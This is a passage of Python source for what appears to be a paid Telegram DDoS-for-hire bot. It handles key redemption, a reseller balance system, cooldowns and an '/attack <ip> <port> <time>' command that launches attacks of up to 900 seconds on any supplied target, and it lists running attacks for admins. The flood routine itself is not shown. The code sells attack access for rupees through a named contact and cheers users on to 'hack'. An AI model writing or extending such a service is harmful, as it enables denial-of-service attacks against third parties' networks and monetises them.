                send_message_safe(message.chat.id, message, create_main_menu())
                return
        if key in keys:
            if keys[key].get("blocked", False):
                message = f"[\\\-=x\\\-=] *KEY BLOCKED* [\\\-=x\\\-=]\n>>> *THIS KEY IS BLOCKED* 🔒\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
                send_message_safe(message.chat.id, message, create_main_menu())
                return
            if len(keys[key]["devices"]) >= keys[key]["device_limit"]:
                message = f"[\\\-=x\\\-=] *DEVICE LIMIT REACHED* [\\\-=x\\\-=]\n>>> *KEY HAS REACHED ITS DEVICE LIMIT* 🚫\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR A NEW KEY\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
                send_message_safe(message.chat.id, message, create_main_menu())
                return
            if user_id in keys[key]["devices"]:
                message = f"[\\\-=x\\\-=] *KEY ALREADY REDEEMED* [\\\-=x\\\-=]\n>>> *YOU HAVE ALREADY REDEEMED THIS KEY* 🔑\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR A NEW KEY\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
                send_message_safe(message.chat.id, message, create_main_menu())
                return
            duration = keys[key]["duration"]
            minutes, hours, days, months = parse_duration(duration)
            if minutes is None and hours is None and days is None and months is None:
                message = f"[\\\-=x\\\-=] *ERROR DETECTED* [\\\-=x\\\-=]\n>>> *INVALID DURATION IN KEY* 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
                send_message_safe(message.chat.id, message, create_main_menu())
                return
            expiration_time = add_time_to_current_date(months=months, days=days, hours=hours, minutes=minutes)
            users[user_id] = expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')
            keys[key]["devices"].append(user_id)
            if len(keys[key]["devices"]) >= keys[key]["device_limit"]:
                del keys[key]
            save_users()
            save_keys()
            message = f"[\\\-=x\\\-=] *KEY REDEMPTION SUCCESS* [\\\-=x\\\-=]\n[*] *ACCESS GRANTED\\, BHAI\\!* ✅🎉\n>>> *EXPIRES ON*: `{escape_markdown_v2(expiration_time.strftime('%Y-%m-%d %I:%M:%S %p'))}` 🕒\n[\\\-=x\\\-=] *LET’S HACK\\, BHAI\\!* [\\\-=x\\\-=] 💻😎"
            send_message_safe(message.chat.id, message, create_main_menu())
        else:
            message = f"[\\\-=x\\\-=] *INVALID KEY* [\\\-=x\\\-=]\n>>> *KEY INVALID OR EXPIRED* 🚫\n>>> *BUY A NEW KEY FOR 50₹ FROM @Rahul_618\\, BHAI\\!* 💸\n[\\\-=x\\\-=] *LET’S GET BACK TO HACKING\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
    except Exception as e:
        log_error(f"Redeem command error: {str(e)}")
        send_message_safe(message.chat.id, f"[\\\-=x\\\-=] *ERROR* [\\\-=x\\\-=]\n>>> *SOMETHING WENT WRONG* 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓", create_main_menu())

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    """Handle /attack command."""
    try:
        log_error(f"Received /attack command from user {message.from_user.id}")
        if message.chat.type != "private":
            message_text = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *THIS BOT WORKS ONLY IN DIRECT MESSAGES* 🔒\n>>> *USE IN PRIVATE CHAT\\, BHAI\\!* 🚫\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message_text)
            return
        user_id = str(message.from_user.id)
        if user_id not in admin_id and user_id not in users and user_id not in authorized_users:
            message = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *UNAUTHORIZED USER DETECTED* 🔒\n>>> *REDEEM A KEY OR CONTACT @Rahul_618 FOR ACCESS\\, BHAI\\!* 💸\n[\\\-=x\\\-=] *LET’S GET YOU IN\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        if user_id in users:
            try:
                expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
                if datetime.datetime.now(IST) >= expiration_date:
                    del users[user_id]
                    save_users()
                    message = f"[\\\-=x\\\-=] *ACCESS EXPIRED* [\\\-=x\\\-=]\n>>> *YOUR KEY HAS EXPIRED* ⏳\n>>> *REDEEM A NEW KEY OR CONTACT @Rahul_618 FOR ACCESS\\, BHAI\\!* 💸\n[\\\-=x\\\-=] *LET’S GET YOU BACK IN\\!* [\\\-=x\\\-=] 💾🤓"
                    send_message_safe(message.chat.id, message, create_main_menu())
                    return
            except ValueError:
                message = f"[\\\-=x\\\-=] *ERROR DETECTED* [\\\-=x\\\-=]\n>>> *INVALID EXPIRATION DATE FORMAT* 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
                send_message_safe(message.chat.id, message, create_main_menu())
                return
        if user_id in authorized_users:
            try:
                expiration_date = datetime.datetime.strptime(authorized_users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
                if datetime.datetime.now(IST) >= expiration_date:
                    del authorized_users[user_id]
                    save_authorized_users()
                    message = f"[\\\-=x\\\-=] *ACCESS EXPIRED* [\\\-=x\\\-=]\n>>> *YOUR AUTHORIZATION HAS EXPIRED* ⏳\n>>> *CONTACT @Rahul_618 FOR ACCESS\\, BHAI\\!* 💸\n[\\\-=x\\\-=] *LET’S GET YOU BACK IN\\!* [\\\-=x\\\-=] 💾🤓"
                    send_message_safe(message.chat.id, message, create_main_menu())
                    return
            except ValueError:
                message = f"[\\\-=x\\\-=] *ERROR DETECTED* [\\\-=x\\\-=]\n>>> *INVALID EXPIRATION DATE FORMAT* 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
                send_message_safe(message.chat.id, message, create_main_menu())
                return
        command = message.text.split()
        if len(command) != 4:
            message = f"[\\\-=x\\\-=] *INVALID SYNTAX DETECTED* [\\\-=x\\\-=]\n>>> *USAGE*: `/attack <ip> <port> <time>` ⚡\n>>> *EXAMPLE*: `/attack 192\\.168\\.1\\.1 80 600`\n[\\\-=x\\\-=] *TRY AGAIN\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        target = command[1]
        try:
            port = int(command[2])
            time = int(command[3])
        except ValueError:
            message = f"[\\\-=x\\\-=] *ERROR DETECTED* [\\\-=x\\\-=]\n>>> *PORT AND TIME MUST BE NUMBERS* 🚨\n>>> *EXAMPLE*: `/attack 192\\.168\\.1\\.1 80 600`\n[\\\-=x\\\-=] *TRY AGAIN\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        if time > 900:
            message = f"[\\\-=x\\\-=] *ERROR DETECTED* [\\\-=x\\\-=]\n>>> *TIME MUST BE LESS THAN 900 SECONDS* ⏳\n[\\\-=x\\\-=] *TRY AGAIN\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        if time <= 0:
            message = f"[\\\-=x\\\-=] *ERROR DETECTED* [\\\-=x\\\-=]\n>>> *TIME MUST BE GREATER THAN 0* ⏳\n[\\\-=x\\\-=] *TRY AGAIN\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        user_info = bot.get_chat(user_id)
        username = user_info.username if user_info.username else f"UserID_{user_id}"
        log_command(user_id, target, port, time)
        record_command_logs(user_id, "attack", target, port, time)
        execute_attack(target, port, time, message.chat.id, username, last_attack_time, user_id)
    except Exception as e:
        log_error(f"Attack command error: {str(e)}")
        send_message_safe(message.chat.id, f"[\\\-=x\\\-=] *ERROR* [\\\-=x\\\-=]\n>>> *SOMETHING WENT WRONG* 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓", create_main_menu())

@bot.message_handler(commands=['addreseller'])
def add_reseller(message):
    """Handle /addreseller command."""
    try:
        log_error(f"Received /addreseller command from user {message.from_user.id}")
        if message.chat.type != "private":
            message_text = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *THIS BOT WORKS ONLY IN DIRECT MESSAGES* 🔒\n>>> *USE IN PRIVATE CHAT\\, BHAI\\!* 🚫\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message_text)
            return
        user_id = str(message.from_user.id)
        if user_id not in admin_id:
            message = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *ADMIN ONLY COMMAND* 🔒\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR ACCESS\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        command = message.text.split()
        if len(command) != 3:
            message = f"[\\\-=x\\\-=] *INVALID SYNTAX DETECTED* [\\\-=x\\\-=]\n>>> *USAGE*: `/addreseller <user_id> <balance>` 💰\n[\\\-=x\\\-=] *TRY AGAIN\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        reseller_id = command[1]
        try:
            initial_balance = int(command[2])
        except ValueError:
            message = f"[\\\-=x\\\-=] *ERROR DETECTED* [\\\-=x\\\-=]\n>>> *INVALID BALANCE AMOUNT* 🚨\n[\\\-=x\\\-=] *TRY AGAIN\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        if reseller_id not in resellers:
            resellers[reseller_id] = initial_balance
            save_resellers(resellers)
            message = f"[\\\-=x\\\-=] *RESELLER PROTOCOL ACTIVATED* [\\\-=x\\\-=]\n[*] *RESELLER ADDED\\, BHAI\\!* ✅💰\n>>> *RESELLER ID*: `{escape_markdown_v2(reseller_id)}` 💻\n>>> *BALANCE*: `{escape_markdown_v2(initial_balance)}` Rs 🤑\n[\\\-=x\\\-=] *SYSTEM UPDATE COMPLETE\\!* [\\\-=x\\\-=] 🟢✨"
            send_message_safe(message.chat.id, message, create_main_menu())
        else:
            message = f"[\\\-=x\\\-=] *ERROR DETECTED* [\\\-=x\\\-=]\n>>> *RESELLER {escape_markdown_v2(reseller_id)} ALREADY EXISTS* 🚫\n[\\\-=x\\\-=] *TRY AGAIN\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
    except Exception as e:
        log_error(f"Add reseller command error: {str(e)}")
        send_message_safe(message.chat.id, f"[\\\-=x\\\-=] *ERROR* [\\\-=x\\\-=]\n>>> *SOMETHING WENT WRONG* 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓", create_main_menu())

@bot.message_handler(commands=['genkey'])
def generate_key(message):
    """Handle /genkey command."""
    try:
        log_error(f"Received /genkey command from user {message.from_user.id}")
        if message.chat.type != "private":
            message_text = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *THIS BOT WORKS ONLY IN DIRECT MESSAGES* 🔒\n>>> *USE IN PRIVATE CHAT\\, BHAI\\!* 🚫\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message_text)
            return
        user_id = str(message.from_user.id)
        command = message.text.split()
        if user_id in admin_id or user_id in resellers:
            if len(command) != 3:
                message = f"[\\\-=x\\\-=] *INVALID SYNTAX DETECTED* [\\\-=x\\\-=]\n>>> *USAGE*: `/genkey <duration> <key_name>` 🔑\n>>> *EXAMPLE*: `/genkey 1d rahul` OR `/genkey 30min rahul`\n[\\\-=x\\\-=] *TRY AGAIN\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
                send_message_safe(message.chat.id, message, create_main_menu())
                return
            duration = command[1].lower()
            key_name = command[2]
        else:
            message = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *ADMIN OR RESELLER ONLY COMMAND* 🔒\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR ACCESS\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        if not re.match(r'^[a-zA-Z0-9_-]+$', key_name):
            message = f"[\\\-=x\\\-=] *ERROR DETECTED* [\\\-=x\\\-=]\n>>> *INVALID KEY NAME*: ONLY LETTERS, NUMBERS, UNDERSCORES, AND HYPHENS ALLOWED 🚨\n[\\\-=x\\\-=] *TRY AGAIN\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        minutes, hours, days, months = parse_duration(duration)
        if minutes is None and hours is None and days is None and months is None:
            message = f"[\\\-=x\\\-=] *ERROR DETECTED* [\\\-=x\\\-=]\n>>> *INVALID DURATION* 🚨\n>>> *VALID FORMATS*: `30min`, `1h`, `1d`, `1m`, `1hours`, `1days`, `1months`\n[\\\-=x\\\-=] *TRY AGAIN\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        cost_duration = duration
        if minutes > 0:
            cost_duration = "1min"
        elif hours >= 24:
            days = hours // 24
            hours = 0
            duration = f"{days}d"
            cost_duration = duration
        elif days >= 30:
            months = days // 30
            days = 0
            duration = f"{months}m"
            cost_duration = duration
        elif months > 0:
            cost_duration = "1m" if months == 1 else f"{months}m"
        elif days > 0:
            cost_duration = "1d" if days == 1 else f"{days}d"
        elif hours > 0:
            cost_duration = "1h" if hours == 1 else f"{hours}h"
        custom_key = f"Rahul_sadiq-{key_name}"
        device_limit = 1
        user_info = bot.get_chat(user_id)
        generated_by = user_info.username if user_info.username else f"UserID_{user_id}"
        key_data = {
            "duration": duration,
            "device_limit": device_limit,
            "devices": keys.get(custom_key, {}).get("devices", []),
            "blocked": keys.get(custom_key, {}).get("blocked", False),
            "generated_time": datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p'),
            "generated_by": generated_by
        }
        keys[custom_key] = key_data
        save_keys()
        for user_id in key_data["devices"]:
            if user_id in users:
                expiration_time = add_time_to_current_date(months=months, days=days, hours=hours, minutes=minutes)
                users[user_id] = expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')
        save_users()
        message = f"[\\\-=x\\\-=] *KEY GENERATION PROTOCOL* [\\\-=x\\\-=]\n[*] *KEY {'UPDATED' if custom_key in keys else 'GENERATED'} SUCCESSFULLY\\, BHAI\\!* ✅🔑\n>>> *KEY*: `{escape_markdown_v2(custom_key)}` 🔓\n>>> *DURATION*: `{escape_markdown_v2(duration)}` ⏱️\n>>> *DEVICE LIMIT*: `{escape_markdown_v2(device_limit)}` 📱\n>>> *GENERATED BY*: @{escape_markdown_v2(generated_by)} 💻\n>>> *GENERATED ON*: `{escape_markdown_v2(key_data['generated_time'])}` 🕒"
        if user_id in resellers:
            cost = KEY_COST.get(cost_duration, 0)
            if cost > 0:
                resellers[user_id] -= cost
                save_resellers(resellers)
                message += f"\n>>> *COST*: `{escape_markdown_v2(cost)}` Rs 💸\n>>> *REMAINING BALANCE*: `{escape_markdown_v2(resellers[user_id])}` Rs 🤑"
        message += f"\n[\\\-=x\\\-=] *KEY READY TO HACK\\!* [\\\-=x\\\-=] 💥😎"
        send_message_safe(message.chat.id, message, create_main_menu())
    except Exception as e:
        log_error(f"Genkey command error: {str(e)}")
        send_message_safe(message.chat.id, f"[\\\-=x\\\-=] *ERROR* [\\\-=x\\\-=]\n>>> *SOMETHING WENT WRONG* 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓", create_main_menu())

@bot.message_handler(commands=['myinfo'])
def my_info(message):
    """Handle /myinfo command."""
    try:
        log_error(f"Received /myinfo command from user {message.from_user.id}")
        if message.chat.type != "private":
            message_text = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *THIS BOT WORKS ONLY IN DIRECT MESSAGES* 🔒\n>>> *USE IN PRIVATE CHAT\\, BHAI\\!* 🚫\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message_text)
            return
        user_id = str(message.from_user.id)
        user_info = bot.get_chat(user_id)
        username = user_info.username if user_info.username else f"UserID_{user_id}"
        access_status = "NO ACCESS"
        expiration = "N/A"
        if user_id in admin_id:
            access_status = "ADMIN ACCESS"
            expiration = "NEVER EXPIRES"
        elif user_id in authorized_users:
            access_status = "AUTHORIZED ACCESS"
            try:
                expiration_date = datetime.datetime.strptime(authorized_users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
                expiration = expiration_date.strftime('%Y-%m-%d %I:%M:%S %p')
                if datetime.datetime.now(IST) >= expiration_date:
                    access_status = "ACCESS EXPIRED"
                    expiration = "EXPIRED"
            except ValueError:
                expiration = "ERROR"
        elif user_id in users:
            access_status = "KEY ACCESS"
            try:
                expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
                expiration = expiration_date.strftime('%Y-%m-%d %I:%M:%S %p')
                if datetime.datetime.now(IST) >= expiration_date:
                    access_status = "ACCESS EXPIRED"
                    expiration = "EXPIRED"
            except ValueError:
                expiration = "ERROR"
        message = f"[\\\-=x\\\-=] *USER PROFILE* [\\\-=x\\\-=]\n[*] *YOUR INFO\\, BHAI\\!* 👤✨\n>>> *USERNAME*: @{escape_markdown_v2(username)} 💻\n>>> *USER ID*: `{escape_markdown_v2(user_id)}` 🆔\n>>> *ACCESS STATUS*: `{escape_markdown_v2(access_status)}` 🟢\n>>> *EXPIRATION*: `{escape_markdown_v2(expiration)}` ⏳\n[\\\-=x\\\-=] *KEEP HACKING\\, BHAI\\!* [\\\-=x\\\-=] 💥😎"
        send_message_safe(message.chat.id, message, create_main_menu())
    except Exception as e:
        log_error(f"Myinfo command error: {str(e)}")
        send_message_safe(message.chat.id, f"[\\\-=x\\\-=] *ERROR* [\\\-=x\\\-=]\n>>> *SOMETHING WENT WRONG* 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓", create_main_menu())

@bot.message_handler(commands=['listkeys'])
def list_keys(message):
    """Handle /listkeys command."""
    try:
        log_error(f"Received /listkeys command from user {message.from_user.id}")
        if message.chat.type != "private":
            message_text = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *THIS BOT WORKS ONLY IN DIRECT MESSAGES* 🔒\n>>> *USE IN PRIVATE CHAT\\, BHAI\\!* 🚫\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message_text)
            return
        user_id = str(message.from_user.id)
        if user_id not in admin_id:
            message = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *ADMIN ONLY COMMAND* 🔒\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR ACCESS\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        if not keys:
            message = f"[\\\-=x\\\-=] *KEY DATABASE* [\\\-=x\\\-=]\n[*] *NO KEYS FOUND\\, BHAI\\!* 📋🚫\n[\\\-=x\\\-=] *GENERATE SOME KEYS\\!* [\\\-=x\\\-=] 🔑😎"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        key_list = []
        for key, data in keys.items():
            key_info = f">>> *KEY*: `{escape_markdown_v2(key)}` 🔑\n>>> *DURATION*: `{escape_markdown_v2(data['duration'])}` ⏱️\n>>> *DEVICE LIMIT*: `{escape_markdown_v2(data['device_limit'])}` 📱\n>>> *DEVICES*: `{escape_markdown_v2(len(data['devices']))}` 💻\n>>> *BLOCKED*: `{escape_markdown_v2('YES' if data.get('blocked', False) else 'NO')}` 🔒\n>>> *GENERATED BY*: @{escape_markdown_v2(data['generated_by'])} 🧑‍💻\n>>> *GENERATED ON*: `{escape_markdown_v2(data['generated_time'])}` 🕒\n"
            key_list.append(key_info)
        message = f"[\\\-=x\\\-=] *KEY DATABASE* [\\\-=x\\\-=]\n[*] *ALL KEYS LISTED\\, BHAI\\!* 📋✨\n\n{''.join(key_list)}[\\\-=x\\\-=] *KEEP MANAGING\\, BHAI\\!* [\\\-=x\\\-=] 💾😎"
        send_message_safe(message.chat.id, message, create_main_menu())
    except Exception as e:
        log_error(f"Listkeys command error: {str(e)}")
        send_message_safe(message.chat.id, f"[\\\-=x\\\-=] *ERROR* [\\\-=x\\\-=]\n>>> *SOMETHING WENT WRONG* 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓", create_main_menu())

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    """Handle inline button callbacks."""
    try:
        user_id = str(call.from_user.id)
        log_error(f"Received callback query {call.data} from user {user_id}")
        if call.data == "menu_attack":
            message = f"[\\\-=x\\\-=] *ATTACK PROTOCOL* [\\\-=x\\\-=]\n>>> *USAGE*: `/attack <ip> <port> <time>` ⚡\n>>> *EXAMPLE*: `/attack 192\\.168\\.1\\.1 80 600`\n[\\\-=x\\\-=] *UNLEASH THE POWER\\, BHAI\\!* [\\\-=x\\\-=] 💥😎"
            send_message_safe(call.message.chat.id, message, create_main_menu())
        elif call.data == "menu_redeem":
            message = f"[\\\-=x\\\-=] *KEY REDEMPTION* [\\\-=x\\\-=]\n>>> *USAGE*: `/redeem <key_name>` 🔓\n>>> *EXAMPLE*: `/redeem Rahul_sadiq-rahul`\n[\\\-=x\\\-=] *GET ACCESS\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(call.message.chat.id, message, create_main_menu())
        elif call.data == "menu_help":
            help_command(call.message)
        elif call.data == "menu_balance":
            check_balance(call.message)
        elif call.data == "menu_myinfo":
            my_info(call.message)
        elif call.data == "menu_listkeys":
            list_keys(call.message)
        bot.answer_callback_query(call.id)
    except Exception as e:
        log_error(f"Callback query error: {str(e)}")
        send_message_safe(call.message.chat.id, f"[\\\-=x\\\-=] *ERROR* [\\\-=x\\\-=]\n>>> *SOMETHING WENT WRONG* 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓", create_main_menu())

@bot.message_handler(commands=['attacks'])
def list_attacks(message):
    """Handle /attacks command to list running attacks."""
    try:
        log_error(f"Received /attacks command from user {message.from_user.id}")
        if message.chat.type != "private":
            message_text = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *THIS BOT WORKS ONLY IN DIRECT MESSAGES* 🔒\n>>> *USE IN PRIVATE CHAT\\, BHAI\\!* 🚫\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message_text)
            return
        user_id = str(message.from_user.id)
        if user_id not in admin_id:
            message = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *ADMIN ONLY COMMAND* 🔒\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR ACCESS\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        if not running_attacks:
            message = f"[\\\-=x\\\-=] *ATTACK STATUS* [\\\-=x\\\-=]\n[*] *NO ACTIVE ATTACKS\\, BHAI\\!* 🚫\n[\\\-=x\\\-=] *READY FOR DEPLOYMENT\\!* [\\\-=x\\\-=] 💾😎"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        attack_list = []
        for attack_id, data in running_attacks.items():
            attack_info = f">>> *ATTACK ID*: `{escape_markdown_v2(attack_id)}` 🆔\n>>> *TARGET*: `{escape_markdown_v2(data['target'])}:{escape_markdown_v2(data['port'])}` 🌐\n>>> *DURATION*: `{escape_markdown_v2(data['time'])}` SECONDS ⏱️\n>>> *STARTED*: `{escape_markdown_v2(data['start_time'].strftime('%Y-%m-%d %I:%M:%S %p'))}` 🕒\n>>> *ATTACKER*: @{escape_markdown_v2(data['username'])} 💻\n"
            attack_list.append(attack_info)
        message = f"[\\\-=x\\\-=] *ACTIVE ATTACKS* [\\\-=x\\\-=]\n[*] *CURRENTLY RUNNING ATTACKS\\, BHAI\\!* 🔥💥\n\n{''.join(attack_list)}[\\\-=x\\\-=] *KEEP MONITORING\\, BHAI\\!* [\\\-=x\\\-=] 💾😎"
        send_message_safe(message.chat.id, message, create_main_menu())
    except Exception as e:
        log_error(f"Attacks command error: {str(e)}")
        send_message_safe(message.chat.id, f"[\\\-=x\\\-=] *ERROR* [\\\-=x\\\-=]\n>>> *SOMETHING WENT WRONG* 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓", create_main_menu())

@bot.message_handler(commands=['setcooldown'])
def set_cooldown_command(message):
    """Handle /setcooldown command."""
    try:
        log_error(f"Received /setcooldown command from user {message.from_user.id}")
        if message.chat.type != "private":
            message_text = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *THIS BOT WORKS ONLY IN DIRECT MESSAGES* 🔒\n>>> *USE IN PRIVATE CHAT\\, BHAI\\!* 🚫\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message_text)
            return
        user_id = str(message.from_user.id)
        if user_id not in admin_id:
            message = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *ADMIN ONLY COMMAND* 🔒\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR ACCESS\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        command = message.text.split()
        if len(command) != 2:
            message = f"[\\\-=x\\\-=] *INVALID SYNTAX DETECTED* [\\\-=x\\\-=]\n>>> *USAGE*: `/setcooldown <seconds>` ⏳\n>>> *EXAMPLE*: `/setcooldown 120`\n[\\\-=x\\\-=] *TRY AGAIN\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        try:
            seconds = int(command[1])
            set_cooldown(seconds)
            message = f"[\\\-=x\\\-=] *COOLDOWN UPDATED* [\\\-=x\\\-=]\n[*] *COOLDOWN SET\\, BHAI\\!* ✅⏳\n>>> *NEW COOLDOWN*: `{escape_markdown_v2(seconds)}` SECONDS\n[\\\-=x\\\-=] *SYSTEM READY\\!* [\\\-=x\\\-=] 💾😎"
            send_message_safe(message.chat.id, message, create_main_menu())
        except ValueError:
            message = f"[\\\-=x\\\-=] *ERROR DETECTED* [\\\-=x\\\-=]\n>>> *INVALID SECONDS VALUE* 🚨\n[\\\-=x\\\-=] *TRY AGAIN\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
    except Exception as e:
        log_error(f"Setcooldown command error: {str(e)}")
        send_message_safe(message.chat.id, f"[\\\-=x\\\-=] *ERROR* [\\\-=x\\\-=]\n>>> *SOMETHING WENT WRONG* 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓", create_main_menu())

@bot.message_handler(commands=['checkcooldown'])
def check_cooldown_command(message):
    """Handle /checkcooldown command."""
    try:
        log_error(f"Received /checkcooldown command from user {message.from_user.id}")
        if message.chat.type != "private":
            message_text = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *THIS BOT WORKS ONLY IN DIRECT MESSAGES* 🔒\n>>> *USE IN PRIVATE CHAT\\, BHAI\\!* 🚫\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message_text)
            return
        message = f"[\\\-=x\\\-=] *COOLDOWN STATUS* [\\\-=x\\\-=]\n[*] *CURRENT COOLDOWN\\, BHAI\\!* ⏳\n>>> *COOLDOWN*: `{escape_markdown_v2(COOLDOWN_PERIOD)}` SECONDS\n[\\\-=x\\\-=] *KEEP HACKING\\!* [\\\-=x\\\-=] 💾😎"
        send_message_safe(message.chat.id, message, create_main_menu())
    except Exception as e:
        log_error(f"Checkcooldown command error: {str(e)}")
        send_message_safe(message.chat.id, f"[\\\-=x\\\-=] *ERROR* [\\\-=x\\\-=]\n>>> *SOMETHING WENT WRONG* 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓", create_main_menu())

@bot.message_handler(commands=['logs'])
def view_logs(message):
    """Handle /logs command to view recent logs."""
    try:
        log_error(f"Received /logs command from user {message.from_user.id}")
